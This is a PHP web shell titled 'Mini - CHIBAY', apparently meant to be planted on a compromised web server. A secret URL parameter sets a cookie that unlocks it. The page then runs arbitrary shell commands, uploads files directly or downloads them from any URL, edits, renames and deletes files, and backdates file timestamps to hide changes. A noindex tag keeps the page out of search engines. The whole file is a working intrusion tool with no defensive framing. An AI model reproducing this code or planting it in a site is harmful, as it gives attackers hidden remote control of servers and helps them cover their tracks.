<?php null;

if (isset($_GET['akses']) && $_GET['akses'] === 'molek') {
    setcookie('molek', md5('molek'), time() + (86400 * 30), "/");
}

if (!isset($_COOKIE['molek'])) {
    die;
}
?>
<?php
session_start();

function generate_random_name() {
    return bin2hex(random_bytes(8));
}

if (!isset($_SESSION['dir_map'])) {
    $_SESSION['dir_map'] = [];
}

if (isset($_GET['dir'])) {
    $random_name = $_GET['dir'];
    if (isset($_SESSION['dir_map'][$random_name])) {
        $current_dir = $_SESSION['dir_map'][$random_name];
    } else {
        die("Invalid directory");
    }
} else {
    $current_dir = getcwd();
    $random_name = generate_random_name();
    $_SESSION['dir_map'][$random_name] = $current_dir;
}

if (!is_dir($current_dir)) {
    die("Invalid directory");
}

chdir($current_dir);

if (isset($_GET['cmd_pipe'])) {
    $cmd_pipe = $_GET['cmd_pipe'];
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    $process = proc_open($cmd_pipe, $descriptorspec, $pipes);
    if (is_resource($process)) {
        $output_pipe = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        proc_close($process);
    }
}

if (isset($_GET['cmd'])) {
    $old_dir = getcwd(); // Simpan direktori saat ini
    $output = shell_exec($_GET['cmd'] . " 2>&1");
    chdir($old_dir); // Kembali ke direktori sebelumnya
}

if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $current_dir . '/' . $_FILES['file']['name']);
}

if (isset($_POST['file_url']) && isset($_POST['file_name']) && isset($_POST['upload_method'])) {
    $file_url = $_POST['file_url'];
    $file_name = $_POST['file_name'];
    $upload_method = $_POST['upload_method'];

    switch ($upload_method) {
        case 'curl':
            $curl = curl_init($file_url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            $data = curl_exec($curl);
            curl_close($curl);
            file_put_contents($current_dir . '/' . $file_name, $data);
            break;

        case 'file_get_contents':
            $data = file_get_contents($file_url);
            file_put_contents($current_dir . '/' . $file_name, $data);
            break;

        case 'fopen':
            $source = fopen($file_url, 'r');
            $destination = fopen($current_dir . '/' . $file_name, 'w');
            stream_copy_to_stream($source, $destination);
            fclose($source);
            fclose($destination);
            break;

        case 'copy':
            copy($file_url, $current_dir . '/' . $file_name);
            break;

        case 'stream_context':
            $context = stream_context_create(['http' => ['method' => 'GET']]);
            $data = file_get_contents($file_url, false, $context);
            file_put_contents($current_dir . '/' . $file_name, $data);
            break;

        default:
            die("Invalid upload method");
    }
}

if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $old_path = $current_dir . '/' . $_POST['rename_old'];
    $new_path = $current_dir . '/' . $_POST['rename_new'];
    if (file_exists($old_path)) {
        rename($old_path, $new_path);
    }
}

if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $file_to_edit = $current_dir . '/' . $_POST['edit_file'];
    if (file_exists($file_to_edit)) {
        file_put_contents($file_to_edit, $_POST['file_content']);
    }
}

if (isset($_POST['edit_date_file']) && isset($_POST['new_date'])) {
    $file_to_edit = $current_dir . '/' . $_POST['edit_date_file'];
    $new_date = strtotime($_POST['new_date']);
    if (file_exists($file_to_edit)) {
        touch($file_to_edit, $new_date);
    }
}

if (isset($_GET['delete'])) {
    $path_to_delete = $current_dir . '/' . $_GET['delete'];
    if (file_exists($path_to_delete)) {
        if (is_dir($path_to_delete)) {
            array_map('unlink', glob("$path_to_delete/*"));
            rmdir($path_to_delete);
        } else {
            unlink($path_to_delete);
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap" rel="stylesheet">
    <style>
        .chibay-title {
            font-family: 'Playfair Display', serif;
            font-size: 4rem;
            letter-spacing: 5px;
            color: #ff0000;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        body {
            font-family: 'Playfair Display', serif;
        }
        h2, h3, p, table {
            font-family: 'Playfair Display', serif;
        }
        .btn, .form-control {
            font-family: 'Playfair Display', serif;
        }
        .form-container {
            max-width: 800px;
            margin: auto;
            padding: 20px;
            background-color: #222;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
        }
        .form-container h2 {
            text-align: center;
            font-size: 24px;
            color: white;
            margin-bottom: 20px;
        }
        .form-container .form-group {
            margin-bottom: 15px;
        }
        .form-container .form-control {
            font-size: 14px;
            padding: 8px;
        }
        .form-container .btn {
            font-size: 14px;
            padding: 8px 15px;
        }
    </style>
    <title>Mini - CHIBAY</title>
</head>
<body class="bg-dark text-light">
    <div class="container-fluid">
        <div class="py-3" id="main">
            <div class="box shadow bg-dark p-4 rounded-3">
                <h1 class="text-center chibay-title">C H I B A Y</h1>
                <h2 class="text-center">Directory Listing</h2>
                <p class="text-center">
                    <?php 
                    $parts = explode('/', trim($current_dir, '/'));
                    $path_accumulate = '';
                    foreach ($parts as $index => $part) {
                        $path_accumulate .= '/' . $part;
                        $random_name = generate_random_name();
                        $_SESSION['dir_map'][$random_name] = $path_accumulate;
                        echo "<a href='?dir=" . urlencode($random_name) . "' class='text-light text-decoration-none'>$part</a>";
                        if ($index < count($parts) - 1) echo ' / ';
                    }
                    ?>
                </p>

                <!-- Form untuk menjalankan command -->
                <div class="form-container">
                    <h2>Execute Command</h2>
                    <form method="GET" class="mb-4">
                        <div class="form-group">
                            <input type="text" name="cmd" class="form-control" placeholder="Enter command">
                        </div>
                        <div class="form-group text-center">
                            <button type="submit" class="btn btn-outline-light">Execute</button>
                        </div>
                    </form>
                    <?php if (isset($output)): ?>
                        <pre class="bg-secondary text-light p-3 rounded"><?php echo htmlspecialchars($output); ?></pre>
                    <?php endif; ?>
                </div>

                <!-- Form Upload File -->
                <div class="form-container">
                    <h2>Upload File</h2>
                    <form method='POST' enctype='multipart/form-data'>
                        <div class="form-group">
                            <input type='file' name='file' class='form-control'>
                        </div>
                        <div class="form-group text-center">
                            <button type='submit' class='btn btn-outline-light'>Upload</button>
                        </div>
                    </form>
                </div>

                <!-- Form Upload via URL -->
                <div class="form-container">
                    <h2>Upload via URL</h2>
                    <form method='POST'>
                        <div class="form-group">
                            <label for="file_url" class="form-label">File URL</label>
                            <input type="text" name="file_url" class="form-control" placeholder="Enter file URL">
                        </div>
                        <div class="form-group">
                            <label for="file_name" class="form-label">Save as filename</label>
                            <input type="text" name="file_name" class="form-control" placeholder="Save as filename">
                        </div>
                        <div class="form-group">
                            <label for="upload_method" class="form-label">Upload Method</label>
                            <select name="upload_method" class="form-control">
                                <option value="curl">cURL</option>
                                <option value="file_get_contents">file_get_contents</option>
                                <option value="fopen">fopen</option>
                                <option value="copy">copy</option>
                                <option value="stream_context">stream_context</option>
                            </select>
                        </div>
                        <div class="form-group text-center">
                            <button type="submit" class="btn btn-outline-light">Upload</button>
                        </div>
                    </form>
                </div>

                <!-- Tabel File dan Folder -->
                <table class="table table-dark table-hover">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Owner/Group</th>
                            <th>Permissions</th>
                            <th>Last Modified</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        $files = scandir($current_dir);
                        $folders = array_filter($files, function($file) use ($current_dir) {
                            return is_dir($current_dir . '/' . $file) && $file !== '.' && $file !== '..';
                        });
                        $files = array_filter($files, function($file) use ($current_dir) {
                            return !is_dir($current_dir . '/' . $file);
                        });

                        natcasesort($folders);
                        natcasesort($files);

                        foreach ($folders as $file) {
                            $filepath = realpath($current_dir . '/' . $file);
                            $icon = "<i class='fa fa-folder text-warning'></i>";
                            $dir_random_name = generate_random_name();
                            $_SESSION['dir_map'][$dir_random_name] = $filepath;

                            // Get owner and group
                            $group = posix_getgrgid(filegroup($filepath))['name'];

                            // Get permissions
                            $permissions = substr(sprintf('%o', fileperms($filepath)), -4);

                            // Get last modified date
                            $last_modified = date("Y-m-d H:i:s", filemtime($filepath));

                            echo "<tr>
                                    <td>$icon <a href='?dir=" . urlencode($dir_random_name) . "' class='text-light text-decoration-none'>$file</a></td>
                                    <td>-</td>
                                    <td>$owner/$group</td>
                                    <td>$permissions</td>
                                    <td>$last_modified</td>
                                    <td>
                                        <a href='?delete=" . urlencode($file) . "' class='btn btn-outline-danger btn-sm' onclick=\"return confirm('Are you sure?');\">Delete</a>
                                        <button type='button' class='btn btn-outline-warning btn-sm' data-bs-toggle='modal' data-bs-target='#renameModal' data-filename='$file'>Rename</button>
                                        <button type='button' class='btn btn-outline-info btn-sm' data-bs-toggle='modal' data-bs-target='#editDateModal' data-filename='$file'>Edit Date</button>
                                    </td>
                                  </tr>";
                        }

                        foreach ($files as $file) {
                            $filepath = realpath($current_dir . '/' . $file);
                            $size = is_file($filepath) ? filesize($filepath) : '-';
                            $icon = "<i class='fa fa-file text-info'></i>";

                            // Get owner and group
                            $group = posix_getgrgid(filegroup($filepath))['name'];

                            // Get permissions
                            $permissions = substr(sprintf('%o', fileperms($filepath)), -4);

                            // Get last modified date
                            $last_modified = date("Y-m-d H:i:s", filemtime($filepath));

                            echo "<tr>
                                    <td>$icon <a href='?dir=" . urlencode($random_name) . "' class='text-light text-decoration-none'>$file</a></td>
                                    <td>$size</td>
                                    <td>$owner/$group</td>
                                    <td>$permissions</td>
                                    <td>$last_modified</td>
                                    <td>
                                        <a href='?delete=" . urlencode($file) . "' class='btn btn-outline-danger btn-sm' onclick=\"return confirm('Are you sure?');\">Delete</a>
                                        <button type='button' class='btn btn-outline-warning btn-sm' data-bs-toggle='modal' data-bs-target='#renameModal' data-filename='$file'>Rename</button>
                                        <button type='button' class='btn btn-outline-info btn-sm' data-bs-toggle='modal' data-bs-target='#editModal' data-filename='$file'>Edit</button>
                                        <button type='button' class='btn btn-outline-info btn-sm' data-bs-toggle='modal' data-bs-target='#editDateModal' data-filename='$file'>Edit Date</button>
                                    </td>
                                  </tr>";
                        }
                        ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- Rename Modal -->
    <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content bg-dark">
                <div class="modal-header">
                    <h5 class="modal-title" id="renameModalLabel">Rename File/Folder</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST">
                    <div class="modal-body">
                        <input type="hidden" name="rename_old" id="rename_old">
                        <input type="text" name="rename_new" class="form-control" placeholder="New name">
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        <button type="submit" class="btn btn-primary">Rename</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Edit Modal -->
    <div class="modal fade" id="editModal" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content bg-dark">
                <div class="modal-header">
                    <h5 class="modal-title" id="editModalLabel">Edit File</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST">
                    <div class="modal-body">
                        <input type="hidden" name="edit_file" id="edit_file">
                        <textarea name="file_content" class="form-control" rows="10"></textarea>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        <button type="submit" class="btn btn-primary">Save changes</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Edit Date Modal -->
    <div class="modal fade" id="editDateModal" tabindex="-1" aria-labelledby="editDateModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content bg-dark">
                <div class="modal-header">
                    <h5 class="modal-title" id="editDateModalLabel">Edit File Date</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST">
                    <div class="modal-body">
                        <input type="hidden" name="edit_date_file" id="edit_date_file">
                        <label for="new_date">New Date:</label>
                        <input type="text" name="new_date" class="form-control" required>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        <button type="submit" class="btn btn-primary">Save changes</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var renameModal = document.getElementById('renameModal');
            renameModal.addEventListener('show.bs.modal', function (event) {
                var button = event.relatedTarget;
                var filename = button.getAttribute('data-filename');
                var modalInput = renameModal.querySelector('#rename_old');
                modalInput.value = filename;
            });

            var editModal = document.getElementById('editModal');
            editModal.addEventListener('show.bs.modal', function (event) {
                var button = event.relatedTarget;
                var filename = button.getAttribute('data-filename');
                var modalInput = editModal.querySelector('#edit_file');
                modalInput.value = filename;

                fetch('?cmd=cat ' + filename)
                    .then(response => response.text())
                    .then(data => {
                        editModal.querySelector('textarea').value = data;
                    });
            });

            var editDateModal = document.getElementById('editDateModal');
            editDateModal.addEventListener('show.bs.modal', function (event) {
                var button = event.relatedTarget;
                var filename = button.getAttribute('data-filename');
                var modalInput = editDateModal.querySelector('#edit_date_file');
                modalInput.value = filename;
            });
        });
    </script>
</body>
</html>
